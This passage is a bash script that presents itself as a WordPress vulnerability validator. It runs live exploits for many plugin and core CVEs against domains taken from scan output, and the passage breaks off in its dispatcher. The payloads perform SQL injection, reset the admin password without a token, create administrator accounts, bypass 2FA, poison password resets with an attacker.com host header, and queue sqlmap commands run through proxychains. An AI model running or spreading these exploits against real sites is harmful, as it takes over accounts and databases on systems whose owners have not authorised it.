#!/bin/bash
# ============================================================
# WordPress Universal Vulnerability Validator
# Checks: SQLi (time-based), auth bypass, privesc, 2FA bypass
# Usage:  ./validate_wp_sqli.sh [-o output_dir] [--csv] <nuclei_output.txt | url>
# ============================================================

set -euo pipefail
IFS=$'\n\t'

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
BOLD='\033[1m'
NC='\033[0m'

SLEEP_SEC=6
THRESHOLD=5
TIMEOUT=12
CSV_MODE=0
OUTDIR="/tmp/wp_validate_$(date +%Y%m%d_%H%M%S)"

# ============================================
# Parse arguments
# ============================================
POSITIONAL=()
while [[ $# -gt 0 ]]; do
    case "$1" in
        -o)
            OUTDIR="$2"
            shift 2
            ;;
        --csv)
            CSV_MODE=1
            shift
            ;;
        *)
            POSITIONAL+=("$1")
            shift
            ;;
    esac
done
set -- "${POSITIONAL[@]:-}"

mkdir -p "$OUTDIR"

RESULTS_FILE="${OUTDIR}/results.txt"
SQLMAP_FILE="${OUTDIR}/sqlmap_commands.txt"
VULN_FILE="${OUTDIR}/vuln_domains.txt"
FULL_LOG="${OUTDIR}/full_log.txt"
CSV_FILE="${OUTDIR}/results.csv"

exec > >(tee -a "$FULL_LOG") 2>&1

if [ "$CSV_MODE" -eq 1 ] && [ ! -f "$CSV_FILE" ]; then
    echo "domain,cve,type,payload,status" > "$CSV_FILE"
fi

# ============================================
# Helpers
# ============================================
log_vuln() {
    local DOMAIN="$1" CVE="$2" STATUS="$3" PAYLOAD="$4"
    local TYPE="${5:-exploit}"
    echo -e "${RED}  [VULN] ${DOMAIN} | ${CVE} | ${STATUS} | ${PAYLOAD}${NC}"
    echo "${DOMAIN} | ${CVE} | ${STATUS} | ${PAYLOAD}" >> "$RESULTS_FILE"
    echo "$DOMAIN" >> "$VULN_FILE"
    if [ "$CSV_MODE" -eq 1 ]; then
        local SAFE_PAYLOAD
        SAFE_PAYLOAD=$(echo "$PAYLOAD" | sed 's/"/""/g')
        echo "\"${DOMAIN}\",\"${CVE}\",\"${TYPE}\",\"${SAFE_PAYLOAD}\",\"${STATUS}\"" >> "$CSV_FILE"
    fi
}

log_safe() {
    local DOMAIN="$1" CVE="$2" MSG="$3"
    echo -e "${GREEN}  [SAFE] ${DOMAIN} | ${CVE} | ${MSG}${NC}"
}

add_sqlmap() {
    echo "$1" >> "$SQLMAP_FILE"
}

# Time-based injection helper: returns elapsed seconds
time_check() {
    local URL="$1"
    local METHOD="${2:-GET}"
    local DATA="${3:-}"
    local EXTRA_HEADER="${4:-}"
    local SLEEP_OVERRIDE="${5:-$SLEEP_SEC}"

    local START END DUR
    START=$(date +%s)
    if [ -n "$EXTRA_HEADER" ]; then
        curl -sk -o /dev/null -m $((SLEEP_OVERRIDE + TIMEOUT)) \
            -H "$EXTRA_HEADER" \
            -X "$METHOD" \
            ${DATA:+--data "$DATA"} \
            "$URL" 2>/dev/null || true
    else
        curl -sk -o /dev/null -m $((SLEEP_OVERRIDE + TIMEOUT)) \
            -X "$METHOD" \
            ${DATA:+--data "$DATA"} \
            "$URL" 2>/dev/null || true
    fi
    END=$(date +%s)
    DUR=$((END - START))
    echo "$DUR"
}

# GET or POST with body response + status code
http_probe() {
    local URL="$1"
    local METHOD="${2:-GET}"
    local DATA="${3:-}"
    local EXTRA_HEADER="${4:-}"
    local CONTENT_TYPE="${5:-application/x-www-form-urlencoded}"

    if [ -n "$EXTRA_HEADER" ]; then
        curl -sk -L -m "$TIMEOUT" -w "\n%{http_code}" \
            -H "Content-Type: ${CONTENT_TYPE}" \
            -H "$EXTRA_HEADER" \
            -X "$METHOD" \
            ${DATA:+--data "$DATA"} \
            "$URL" 2>/dev/null || true
    else
        curl -sk -L -m "$TIMEOUT" -w "\n%{http_code}" \
            -H "Content-Type: ${CONTENT_TYPE}" \
            -X "$METHOD" \
            ${DATA:+--data "$DATA"} \
            "$URL" 2>/dev/null || true
    fi
}

# Check plugin presence via readme.txt, return 0 if found
plugin_check() {
    local BASE_URL="$1"
    local PLUGIN_SLUG="$2"
    local HTTP
    HTTP=$(curl -sk -o /dev/null -w "%{http_code}" -m "$TIMEOUT" \
        "${BASE_URL}/wp-content/plugins/${PLUGIN_SLUG}/readme.txt" 2>/dev/null || echo "000")
    [ "$HTTP" = "200" ]
}

# ============================================
# CVE-2024-27956 — WP Automatic SQLi
# ============================================
check_cve_2024_27956() {
    local BASE_URL="$1"
    local DOMAIN="$2"
    local CVE="CVE-2024-27956"
    local VULNS=0

    echo -e "\n${YELLOW}[${CVE}] WP Automatic — q SQLi time-based${NC}"

    if ! plugin_check "$BASE_URL" "wp-automatic"; then
        echo -e "${RED}  Plugin not found${NC}"
        return
    fi

    local PAYLOAD="0 UNION SELECT 1,SLEEP(${SLEEP_SEC}),3,4,5,6,7,8,9,10--+-"
    local DUR
    DUR=$(time_check "${BASE_URL}/wp-content/plugins/wp-automatic/inc/csv.php" "POST" \
        "q=$(python3 -c "import urllib.parse; print(urllib.parse.quote('$PAYLOAD'))" 2>/dev/null || echo '%30+UNION+SELECT+1%2CSLEEP(6)%2C3%2C4%2C5%2C6%2C7%2C8%2C9%2C10--+-')")

    if [ "$DUR" -ge "$THRESHOLD" ]; then
        log_vuln "$DOMAIN" "$CVE" "CONFIRMED" "q UNION+SLEEP=${DUR}s" "sqli"
        VULNS=$((VULNS+1))
        add_sqlmap "proxychains4 -q sqlmap -u \"${BASE_URL}/wp-content/plugins/wp-automatic/inc/csv.php\" --data=\"q=1\" -p q --technique=T --dbms=MySQL --level=2 --risk=2 --batch --random-agent"
    fi

    [ "$VULNS" -eq 0 ] && log_safe "$DOMAIN" "$CVE" "no injection detected"
}

# ============================================
# CVE-2024-1071 — Ultimate Member SQLi (sorting)
# ============================================
check_cve_2024_1071() {
    local BASE_URL="$1"
    local DOMAIN="$2"
    local CVE="CVE-2024-1071"
    local VULNS=0

    echo -e "\n${YELLOW}[${CVE}] Ultimate Member — sorting SQLi time-based${NC}"

    if ! plugin_check "$BASE_URL" "ultimate-member"; then
        echo -e "${RED}  Plugin not found${NC}"
        return
    fi

    local NONCE
    NONCE=$(curl -sk -m "$TIMEOUT" "${BASE_URL}/" 2>/dev/null | grep -oP '"nonce":"[^"]+' | head -1 | cut -d'"' -f4 || echo "")
    [ -z "$NONCE" ] && NONCE="probe_nonce"

    local PAYLOAD="user_login%2C(SELECT%201%20FROM%20(SELECT%20SLEEP(${SLEEP_SEC}))a)"
    local DUR
    DUR=$(time_check "${BASE_URL}/wp-admin/admin-ajax.php?action=um_get_members" "POST" \
        "nonce=${NONCE}&directory_id=1&sorting=${PAYLOAD}")

    if [ "$DUR" -ge "$THRESHOLD" ]; then
        log_vuln "$DOMAIN" "$CVE" "CONFIRMED" "sorting SLEEP=${DUR}s" "sqli"
        VULNS=$((VULNS+1))
        add_sqlmap "proxychains4 -q sqlmap -u \"${BASE_URL}/wp-admin/admin-ajax.php?action=um_get_members\" --data=\"nonce=${NONCE}&directory_id=1&sorting=user_login\" -p sorting --technique=T --dbms=MySQL --level=2 --risk=2 --batch --random-agent"
    fi

    [ "$VULNS" -eq 0 ] && log_safe "$DOMAIN" "$CVE" "no injection detected"
}

# ============================================
# CVE-2024-1698 — NotificationX SQLi (type)
# ============================================
check_cve_2024_1698() {
    local BASE_URL="$1"
    local DOMAIN="$2"
    local CVE="CVE-2024-1698"
    local VULNS=0

    echo -e "\n${YELLOW}[${CVE}] NotificationX — type SQLi time-based${NC}"

    if ! plugin_check "$BASE_URL" "notificationx"; then
        echo -e "${RED}  Plugin not found${NC}"
        return
    fi

    local DUR
    DUR=$(time_check "${BASE_URL}/wp-admin/admin-ajax.php" "POST" \
        "action=notificationx_get_analytics&type=1+AND+SLEEP(${SLEEP_SEC})+--+-&id=1&from=2024-01-01&to=2024-12-31")

    if [ "$DUR" -ge "$THRESHOLD" ]; then
        log_vuln "$DOMAIN" "$CVE" "CONFIRMED" "type SLEEP=${DUR}s" "sqli"
        VULNS=$((VULNS+1))
        add_sqlmap "proxychains4 -q sqlmap -u \"${BASE_URL}/wp-admin/admin-ajax.php\" --data=\"action=notificationx_get_analytics&type=1&id=1&from=2024-01-01&to=2024-12-31\" -p type --technique=T --dbms=MySQL --level=2 --risk=2 --batch --random-agent"
    fi

    [ "$VULNS" -eq 0 ] && log_safe "$DOMAIN" "$CVE" "no injection detected"
}

# ============================================
# CVE-2023-32243 — Essential Addons password reset bypass
# ============================================
check_cve_2023_32243() {
    local BASE_URL="$1"
    local DOMAIN="$2"
    local CVE="CVE-2023-32243"
    local VULNS=0

    echo -e "\n${YELLOW}[${CVE}] Essential Addons — unauthenticated password reset${NC}"

    if ! plugin_check "$BASE_URL" "essential-addons-for-elementor-lite"; then
        echo -e "${RED}  Plugin not found${NC}"
        return
    fi

    local RESP
    RESP=$(http_probe "${BASE_URL}/wp-admin/admin-ajax.php?action=eael-resetpassword" "POST" \
        "page_id=0&widget_id=0&eael-reset-pass-nonce=invalid&uname=admin&password=Probe1234xXx!")

    local BODY STATUS
    BODY=$(echo "$RESP" | head -n -1)
    STATUS=$(echo "$RESP" | tail -1)

    if echo "$BODY" | grep -qiE '"success"[[:space:]]*:[[:space:]]*true|password_changed|reset_done'; then
        log_vuln "$DOMAIN" "$CVE" "CONFIRMED" "admin password reset without token (HTTP ${STATUS})" "auth-bypass"
        VULNS=$((VULNS+1))
    elif [ "$STATUS" = "200" ] && ! echo "$BODY" | grep -qi "invalid_nonce\|nonce verification\|security_error"; then
        log_vuln "$DOMAIN" "$CVE" "LIKELY" "no nonce error on reset (HTTP 200) — manual verify" "auth-bypass"
        VULNS=$((VULNS+1))
    fi

    [ "$VULNS" -eq 0 ] && log_safe "$DOMAIN" "$CVE" "nonce enforced or plugin absent"
}

# ============================================
# CVE-2023-3460 — Ultimate Member privesc via um-role
# ============================================
check_cve_2023_3460() {
    local BASE_URL="$1"
    local DOMAIN="$2"
    local CVE="CVE-2023-3460"
    local VULNS=0

    echo -e "\n${YELLOW}[${CVE}] Ultimate Member — registration privesc (um-role=administrator)${NC}"

    if ! plugin_check "$BASE_URL" "ultimate-member"; then
        echo -e "${RED}  Plugin not found${NC}"
        return
    fi

    local RAND="probe$(date +%s%N | tail -c 8)"
    local RESP
    RESP=$(http_probe "${BASE_URL}/wp-admin/admin-ajax.php" "POST" \
        "action=um_submit_form&nonce=probe123&form_id=1&um-role=administrator&submitted[user_login]=${RAND}&submitted[user_email]=${RAND}@probe.invalid&submitted[user_password]=Probe1234!&submitted[confirm_user_password]=Probe1234!")

    local BODY STATUS
    BODY=$(echo "$RESP" | head -n -1)
    STATUS=$(echo "$RESP" | tail -1)

    if echo "$BODY" | grep -qiE '"administrator"|role.*administrator|"redirect"'; then
        log_vuln "$DOMAIN" "$CVE" "CONFIRMED" "registered with role=administrator (HTTP ${STATUS})" "privesc"
        VULNS=$((VULNS+1))
    elif [ "$STATUS" = "200" ] && echo "$BODY" | grep -qiE 'success|activation|registered'; then
        log_vuln "$DOMAIN" "$CVE" "LIKELY" "registration succeeded — check role in DB (HTTP 200)" "privesc"
        VULNS=$((VULNS+1))
    fi

    [ "$VULNS" -eq 0 ] && log_safe "$DOMAIN" "$CVE" "registration blocked or role not accepted"
}

# ============================================
# CVE-2024-10924 — Really Simple Security 2FA bypass
# ============================================
check_cve_2024_10924() {
    local BASE_URL="$1"
    local DOMAIN="$2"
    local CVE="CVE-2024-10924"
    local VULNS=0

    echo -e "\n${YELLOW}[${CVE}] Really Simple Security — 2FA bypass via user_id${NC}"

    if ! plugin_check "$BASE_URL" "really-simple-ssl"; then
        echo -e "${RED}  Plugin not found${NC}"
        return
    fi

    local RESP
    RESP=$(http_probe "${BASE_URL}/wp-json/reallysimplessl/v1/two_fa/skip_onboarding" "POST" \
        '{"user_id":1,"login_nonce":"probe_invalid_nonce_xyz"}' "" "application/json")

    local BODY STATUS
    BODY=$(echo "$RESP" | head -n -1)
    STATUS=$(echo "$RESP" | tail -1)

    if echo "$BODY" | grep -qiE '"logged_in"[[:space:]]*:[[:space:]]*true|wordpress_logged_in|"success"[[:space:]]*:[[:space:]]*true'; then
        log_vuln "$DOMAIN" "$CVE" "CONFIRMED" "2FA bypassed for user_id=1 (HTTP ${STATUS})" "auth-bypass"
        VULNS=$((VULNS+1))
    elif [ "$STATUS" = "200" ] && ! echo "$BODY" | grep -qi "rest_forbidden\|invalid_nonce\|error"; then
        log_vuln "$DOMAIN" "$CVE" "LIKELY" "endpoint accepts user_id without valid nonce (HTTP 200)" "auth-bypass"
        VULNS=$((VULNS+1))
    fi

    [ "$VULNS" -eq 0 ] && log_safe "$DOMAIN" "$CVE" "2FA endpoint properly protected"
}

# ============================================
# CVE-2023-28121 — WooCommerce Payments header bypass
# ============================================
check_cve_2023_28121() {
    local BASE_URL="$1"
    local DOMAIN="$2"
    local CVE="CVE-2023-28121"
    local VULNS=0

    echo -e "\n${YELLOW}[${CVE}] WooCommerce Payments — X-WCPAY-PLATFORM-CHECKOUT-USER bypass${NC}"

    if ! plugin_check "$BASE_URL" "woocommerce-payments"; then
        echo -e "${RED}  Plugin not found${NC}"
        return
    fi

    local RESP
    RESP=$(http_probe "${BASE_URL}/wp-json/wp/v2/users/1" "GET" "" \
        "X-WCPAY-PLATFORM-CHECKOUT-USER: 1")

    local BODY STATUS
    BODY=$(echo "$RESP" | head -n -1)
    STATUS=$(echo "$RESP" | tail -1)

    if [ "$STATUS" = "200" ] && echo "$BODY" | grep -qiE '"email"[[:space:]]*:'; then
        log_vuln "$DOMAIN" "$CVE" "CONFIRMED" "admin user details exposed via header spoofing (HTTP 200)" "auth-bypass"
        local EMAIL
        EMAIL=$(echo "$BODY" | grep -oP '"email"\s*:\s*"\K[^"]+' | head -1 || true)
        [ -n "$EMAIL" ] && echo -e "${RED}    Admin email: ${EMAIL}${NC}"
        VULNS=$((VULNS+1))
    fi

    [ "$VULNS" -eq 0 ] && log_safe "$DOMAIN" "$CVE" "header ignored or plugin absent"
}

# ============================================
# CVE-2024-28000 — LiteSpeed Cache hash spoofing
# ============================================
check_cve_2024_28000() {
    local BASE_URL="$1"
    local DOMAIN="$2"
    local CVE="CVE-2024-28000"
    local VULNS=0

    echo -e "\n${YELLOW}[${CVE}] LiteSpeed Cache — weak hash / crawler spoofing${NC}"

    if ! plugin_check "$BASE_URL" "litespeed-cache"; then
        echo -e "${RED}  Plugin not found${NC}"
        return
    fi

    local README
    README=$(curl -sk -m "$TIMEOUT" "${BASE_URL}/wp-content/plugins/litespeed-cache/readme.txt" 2>/dev/null || echo "")
    local VER
    VER=$(echo "$README" | grep -oP 'Stable tag:\s*\K[\d.]+' | head -1 || echo "")

    if [ -n "$VER" ]; then
        local MAJOR MINOR PATCH
        IFS='.' read -r MAJOR MINOR PATCH _ <<< "${VER}.0.0.0"
        if [ "${MAJOR:-0}" -lt 6 ] || { [ "${MAJOR:-0}" -eq 6 ] && [ "${MINOR:-0}" -le 3 ]; }; then
            echo -e "${RED}  Vulnerable version detected: ${VER} (<= 6.3.0.1)${NC}"
            log_vuln "$DOMAIN" "$CVE" "VERSION_MATCH" "LiteSpeed Cache v${VER} <= 6.3.0.1 — hash spoofing possible" "privesc"
            VULNS=$((VULNS+1))
        else
            echo -e "${GREEN}  Version ${VER} — likely patched${NC}"
        fi
    else
        echo -e "${YELLOW}  Could not determine version — checking endpoint${NC}"
        local RESP
        RESP=$(http_probe "${BASE_URL}/?LSCWP_CTRL=before_cloud_init&LSCWP_NONCE=1" "GET" "" \
            "Cookie: litespeed_role=1; litespeed_hash=0")
        local STATUS
        STATUS=$(echo "$RESP" | tail -1)
        if [ "$STATUS" = "200" ]; then
            log_vuln "$DOMAIN" "$CVE" "LIKELY" "crawler init endpoint accessible (HTTP 200)" "privesc"
            VULNS=$((VULNS+1))
        fi
    fi

    [ "$VULNS" -eq 0 ] && log_safe "$DOMAIN" "$CVE" "not vulnerable"
}

# ============================================
# CVE-2020-8772 — InfiniteWP auth bypass
# ============================================
check_cve_2020_8772() {
    local BASE_URL="$1"
    local DOMAIN="$2"
    local CVE="CVE-2020-8772"
    local VULNS=0

    echo -e "\n${YELLOW}[${CVE}] InfiniteWP Client — Base64 JSON auth bypass${NC}"

    if ! plugin_check "$BASE_URL" "iwp-client"; then
        echo -e "${RED}  Plugin not found${NC}"
        return
    fi

    local PAYLOAD_B64="eyJpd3BfYWN0aW9uIjoiYWRkX3NpdGUiLCJwYXJhbXMiOnsidXNlcm5hbWUiOiJhZG1pbiJ9fQ=="
    local RESP
    RESP=$(http_probe "${BASE_URL}/" "POST" \
        "iwp_action=add_site&serialized_option=${PAYLOAD_B64}")

    local BODY STATUS
    BODY=$(echo "$RESP" | head -n -1)
    STATUS=$(echo "$RESP" | tail -1)

    if echo "$BODY" | grep -qiE '"success"[[:space:]]*:[[:space:]]*true|"logged_in"|"administrator"|user_login'; then
        log_vuln "$DOMAIN" "$CVE" "CONFIRMED" "base64 JSON auth bypass succeeded (HTTP ${STATUS})" "auth-bypass"
        VULNS=$((VULNS+1))
    elif [ "$STATUS" = "200" ] && ! echo "$BODY" | grep -qi "invalid\|error\|incorrect"; then
        log_vuln "$DOMAIN" "$CVE" "LIKELY" "no error on crafted payload — manual verify needed" "auth-bypass"
        VULNS=$((VULNS+1))
    fi

    [ "$VULNS" -eq 0 ] && log_safe "$DOMAIN" "$CVE" "payload rejected or plugin absent"
}

# ============================================
# CVE-2023-3076 — MStore API admin registration
# ============================================
check_cve_2023_3076() {
    local BASE_URL="$1"
    local DOMAIN="$2"
    local CVE="CVE-2023-3076"
    local VULNS=0

    echo -e "\n${YELLOW}[${CVE}] MStore API — unauthenticated admin account creation${NC}"

    if ! plugin_check "$BASE_URL" "mstore-api"; then
        echo -e "${RED}  Plugin not found${NC}"
        return
    fi

    local RAND="probe$(date +%s%N | tail -c 8)"
    local RESP
    RESP=$(http_probe "${BASE_URL}/wp-json/mstore-api/v3/customers" "POST" \
        "{\"email\":\"${RAND}@probe.invalid\",\"password\":\"Probe1234!\",\"role\":\"administrator\",\"username\":\"${RAND}\"}" \
        "" "application/json")

    local BODY STATUS
    BODY=$(echo "$RESP" | head -n -1)
    STATUS=$(echo "$RESP" | tail -1)

    if echo "$BODY" | grep -qiE '"role"[[:space:]]*:[[:space:]]*"administrator"|"roles".*administrator'; then
        log_vuln "$DOMAIN" "$CVE" "CONFIRMED" "admin account created via REST (HTTP ${STATUS})" "privesc"
        VULNS=$((VULNS+1))
    elif { [ "$STATUS" = "200" ] || [ "$STATUS" = "201" ]; } && echo "$BODY" | grep -qiE '"id"[[:space:]]*:[[:space:]]*[0-9]+'; then
        log_vuln "$DOMAIN" "$CVE" "LIKELY" "user created via REST — check role (HTTP ${STATUS})" "privesc"
        VULNS=$((VULNS+1))
    fi

    [ "$VULNS" -eq 0 ] && log_safe "$DOMAIN" "$CVE" "registration blocked or role not accepted"
}

# ============================================
# CVE-2023-2449 — UserPro plaintext token
# ============================================
check_cve_2023_2449() {
    local BASE_URL="$1"
    local DOMAIN="$2"
    local CVE="CVE-2023-2449"
    local VULNS=0

    echo -e "\n${YELLOW}[${CVE}] UserPro — plaintext token in wp_usermeta${NC}"

    if ! plugin_check "$BASE_URL" "userpro"; then
        echo -e "${RED}  Plugin not found${NC}"
        return
    fi

    local RESP
    RESP=$(http_probe "${BASE_URL}/?up_activate=1&key=probe&user_id=1" "GET")

    local BODY STATUS
    BODY=$(echo "$RESP" | head -n -1)
    STATUS=$(echo "$RESP" | tail -1)

    if [ "$STATUS" = "200" ] && ! echo "$BODY" | grep -qi "Invalid\|expired\|error\|404"; then
        log_vuln "$DOMAIN" "$CVE" "LIKELY" "activation endpoint accessible without proper token validation (HTTP 200)" "auth-bypass"
        VULNS=$((VULNS+1))
    fi

    [ "$VULNS" -eq 0 ] && log_safe "$DOMAIN" "$CVE" "activation endpoint validates token"
}

# ============================================
# CVE-2023-2437 — UserPro Facebook login bypass
# ============================================
check_cve_2023_2437() {
    local BASE_URL="$1"
    local DOMAIN="$2"
    local CVE="CVE-2023-2437"
    local VULNS=0

    echo -e "\n${YELLOW}[${CVE}] UserPro — Facebook login bypass${NC}"

    if ! plugin_check "$BASE_URL" "userpro"; then
        echo -e "${RED}  Plugin not found${NC}"
        return
    fi

    local RESP
    RESP=$(http_probe "${BASE_URL}/wp-admin/admin-ajax.php" "POST" \
        "action=userpro_facebook_login&fb_access_token=probe_token&fb_user_id=1&fb_user_email=admin@probe.invalid")

    local BODY STATUS
    BODY=$(echo "$RESP" | head -n -1)
    STATUS=$(echo "$RESP" | tail -1)

    if echo "$BODY" | grep -qiE '"loggedin"[[:space:]]*:[[:space:]]*true|'"'"'loggedin'"'"'[[:space:]]*:[[:space:]]*true|logged_in.*true'; then
        log_vuln "$DOMAIN" "$CVE" "CONFIRMED" "Facebook token not validated — logged in (HTTP ${STATUS})" "auth-bypass"
        VULNS=$((VULNS+1))
    elif [ "$STATUS" = "200" ] && ! echo "$BODY" | grep -qi "invalid_token\|error\|false"; then
        log_vuln "$DOMAIN" "$CVE" "LIKELY" "Facebook endpoint responds without token error (HTTP 200)" "auth-bypass"
        VULNS=$((VULNS+1))
    fi

    [ "$VULNS" -eq 0 ] && log_safe "$DOMAIN" "$CVE" "Facebook token properly validated"
}

# ============================================
# CVE-2023-6009 — UserPro privesc (subscriber)
# ============================================
check_cve_2023_6009() {
    local BASE_URL="$1"
    local DOMAIN="$2"
    local CVE="CVE-2023-6009"
    local VULNS=0

    echo -e "\n${YELLOW}[${CVE}] UserPro — privesc via profile update (wp_capabilities)${NC}"

    if ! plugin_check "$BASE_URL" "userpro"; then
        echo -e "${RED}  Plugin not found${NC}"
        return
    fi

    local RESP
    RESP=$(http_probe "${BASE_URL}/wp-admin/admin-ajax.php" "POST" \
        "action=userpro_save_profile&user_id=1&wp_capabilities[administrator]=1&nonce=probe")

    local BODY STATUS
    BODY=$(echo "$RESP" | head -n -1)
    STATUS=$(echo "$RESP" | tail -1)

    if echo "$BODY" | grep -qiE '"success"[[:space:]]*:[[:space:]]*true|saved|updated'; then
        log_vuln "$DOMAIN" "$CVE" "CONFIRMED" "profile update accepted without auth — role escalated (HTTP ${STATUS})" "privesc"
        VULNS=$((VULNS+1))
    elif [ "$STATUS" = "200" ] && ! echo "$BODY" | grep -qi "permission\|not allowed\|denied"; then
        log_vuln "$DOMAIN" "$CVE" "LIKELY" "profile update endpoint accessible without auth check (HTTP 200)" "privesc"
        VULNS=$((VULNS+1))
    fi

    [ "$VULNS" -eq 0 ] && log_safe "$DOMAIN" "$CVE" "profile update requires authentication"
}

# ============================================
# CVE-2024-35700 — UserPro password reset logic flaw
# ============================================
check_cve_2024_35700() {
    local BASE_URL="$1"
    local DOMAIN="$2"
    local CVE="CVE-2024-35700"
    local VULNS=0

    echo -e "\n${YELLOW}[${CVE}] UserPro — password reset without valid token${NC}"

    if ! plugin_check "$BASE_URL" "userpro"; then
        echo -e "${RED}  Plugin not found${NC}"
        return
    fi

    local RESP
    RESP=$(http_probe "${BASE_URL}/wp-admin/admin-ajax.php" "POST" \
        "action=userpro_change_password&user_id=1&new_password=Probe1234!&confirm_password=Probe1234!&key=")

    local BODY STATUS
    BODY=$(echo "$RESP" | head -n -1)
    STATUS=$(echo "$RESP" | tail -1)

    if echo "$BODY" | grep -qiE '"success"[[:space:]]*:[[:space:]]*true|password_changed|changed|updated'; then
        log_vuln "$DOMAIN" "$CVE" "CONFIRMED" "password changed for user_id=1 without token (HTTP ${STATUS})" "auth-bypass"
        VULNS=$((VULNS+1))
    elif [ "$STATUS" = "200" ] && ! echo "$BODY" | grep -qi "invalid\|error\|expired\|token"; then
        log_vuln "$DOMAIN" "$CVE" "LIKELY" "password change endpoint lacks token validation (HTTP 200)" "auth-bypass"
        VULNS=$((VULNS+1))
    fi

    [ "$VULNS" -eq 0 ] && log_safe "$DOMAIN" "$CVE" "token properly validated"
}

# ============================================
# CVE-2024-9863 — UserPro default admin role registration
# ============================================
check_cve_2024_9863() {
    local BASE_URL="$1"
    local DOMAIN="$2"
    local CVE="CVE-2024-9863"
    local VULNS=0

    echo -e "\n${YELLOW}[${CVE}] UserPro — registration with role=administrator${NC}"

    if ! plugin_check "$BASE_URL" "userpro"; then
        echo -e "${RED}  Plugin not found${NC}"
        return
    fi

    local RAND="probe$(date +%s%N | tail -c 8)"
    local RESP
    RESP=$(http_probe "${BASE_URL}/wp-admin/admin-ajax.php" "POST" \
        "action=userpro_ajax_register&nonce=probe&user_login=${RAND}&user_email=${RAND}@probe.invalid&user_pass=Probe1234!&role=administrator")

    local BODY STATUS
    BODY=$(echo "$RESP" | head -n -1)
    STATUS=$(echo "$RESP" | tail -1)

    if echo "$BODY" | grep -qiE '"role"[[:space:]]*:[[:space:]]*"administrator"|"administrator"'; then
        log_vuln "$DOMAIN" "$CVE" "CONFIRMED" "registered as administrator (HTTP ${STATUS})" "privesc"
        VULNS=$((VULNS+1))
    elif [ "$STATUS" = "200" ] && echo "$BODY" | grep -qiE 'success|activation|registered|confirm'; then
        log_vuln "$DOMAIN" "$CVE" "LIKELY" "registration succeeded — verify admin role (HTTP 200)" "privesc"
        VULNS=$((VULNS+1))
    fi

    [ "$VULNS" -eq 0 ] && log_safe "$DOMAIN" "$CVE" "role parameter rejected on registration"
}

# ============================================
# CVE-2025-8489 — King Addons privesc
# ============================================
check_cve_2025_8489() {
    local BASE_URL="$1"
    local DOMAIN="$2"
    local CVE="CVE-2025-8489"
    local VULNS=0

    echo -e "\n${YELLOW}[${CVE}] King Addons — registration privesc${NC}"

    if ! plugin_check "$BASE_URL" "king-addons"; then
        echo -e "${RED}  Plugin not found${NC}"
        return
    fi

    local RAND="probe$(date +%s%N | tail -c 8)"
    local RESP
    RESP=$(http_probe "${BASE_URL}/wp-json/king-addons/v1/register" "POST" \
        "{\"username\":\"${RAND}\",\"email\":\"${RAND}@probe.invalid\",\"password\":\"Probe1234!\",\"role\":\"administrator\"}" \
        "" "application/json")

    local BODY STATUS
    BODY=$(echo "$RESP" | head -n -1)
    STATUS=$(echo "$RESP" | tail -1)

    if echo "$BODY" | grep -qiE '"role"[[:space:]]*:[[:space:]]*"administrator"|"roles".*administrator'; then
        log_vuln "$DOMAIN" "$CVE" "CONFIRMED" "admin account created via King Addons REST (HTTP ${STATUS})" "privesc"
        VULNS=$((VULNS+1))
    elif { [ "$STATUS" = "200" ] || [ "$STATUS" = "201" ]; } && ! echo "$BODY" | grep -qi "rest_forbidden\|error"; then
        log_vuln "$DOMAIN" "$CVE" "LIKELY" "REST registration accessible — check assigned role (HTTP ${STATUS})" "privesc"
        VULNS=$((VULNS+1))
    fi

    [ "$VULNS" -eq 0 ] && log_safe "$DOMAIN" "$CVE" "registration endpoint blocked or role not accepted"
}

# ============================================
# CVE-2026-1492 — User Registration & Membership privesc
# ============================================
check_cve_2026_1492() {
    local BASE_URL="$1"
    local DOMAIN="$2"
    local CVE="CVE-2026-1492"
    local VULNS=0

    echo -e "\n${YELLOW}[${CVE}] User Registration & Membership — role injection on registration${NC}"

    if ! plugin_check "$BASE_URL" "user-registration"; then
        echo -e "${RED}  Plugin not found${NC}"
        return
    fi

    local RAND="probe$(date +%s%N | tail -c 8)"
    local RESP
    RESP=$(http_probe "${BASE_URL}/wp-admin/admin-ajax.php" "POST" \
        "action=user_registration_user_register&nonce=probe&ur_front_username=${RAND}&ur_front_email=${RAND}@probe.invalid&ur_front_password=Probe1234!&ur_front_confirm_password=Probe1234!&role=administrator&form_id=0")

    local BODY STATUS
    BODY=$(echo "$RESP" | head -n -1)
    STATUS=$(echo "$RESP" | tail -1)

    if echo "$BODY" | grep -qiE '"role"[[:space:]]*:[[:space:]]*"administrator"|"administrator"'; then
        log_vuln "$DOMAIN" "$CVE" "CONFIRMED" "registered as administrator (HTTP ${STATUS})" "privesc"
        VULNS=$((VULNS+1))
    elif [ "$STATUS" = "200" ] && echo "$BODY" | grep -qiE 'success|activation|registered|confirm'; then
        log_vuln "$DOMAIN" "$CVE" "LIKELY" "registration succeeded — verify admin role (HTTP 200)" "privesc"
        VULNS=$((VULNS+1))
    fi

    [ "$VULNS" -eq 0 ] && log_safe "$DOMAIN" "$CVE" "role injection blocked or plugin absent"
}

# ============================================
# CVE-2017-8295 — WP Core Host Header redirect
# ============================================
check_cve_2017_8295() {
    local BASE_URL="$1"
    local DOMAIN="$2"
    local CVE="CVE-2017-8295"
    local VULNS=0

    echo -e "\n${YELLOW}[${CVE}] WP Core — Host Header injection in password reset email${NC}"

    local RESP
    RESP=$(curl -sk -L -m "$TIMEOUT" -w "\n%{http_code}" \
        -H "Host: ${DOMAIN}" \
        -H "X-Forwarded-Host: attacker.com" \
        -H "Content-Type: application/x-www-form-urlencoded" \
        --data "user_login=admin&redirect_to=&wp-submit=Get+New+Password" \
        "${BASE_URL}/wp-login.php?action=lostpassword" 2>/dev/null || true)

    local BODY STATUS
    BODY=$(echo "$RESP" | head -n -1)
    STATUS=$(echo "$RESP" | tail -1)

    if echo "$BODY" | grep -qiE 'check.your.email|Check your email|A link has been sent'; then
        log_vuln "$DOMAIN" "$CVE" "LIKELY" "password reset email sent with X-Forwarded-Host=attacker.com (HTTP ${STATUS}) — email may contain attacker domain" "auth-bypass"
        VULNS=$((VULNS+1))
    fi

    [ "$VULNS" -eq 0 ] && log_safe "$DOMAIN" "$CVE" "reset failed or Host header ignored"
}

# ============================================
# Main dispatcher
# ============================================
validate_domain() {
    local INPUT_URL="$1"
    local CVE_HINT="${2:-}"
    local BASE_URL
    BASE_URL=$(echo "$INPUT_URL" | grep -oP 'https?://[^/\s]+')
    local DOMAIN
    DOMAIN=$(echo "$BASE_URL" | sed 's|https\?://||')

    [ -z "$DOMAIN" ] && return

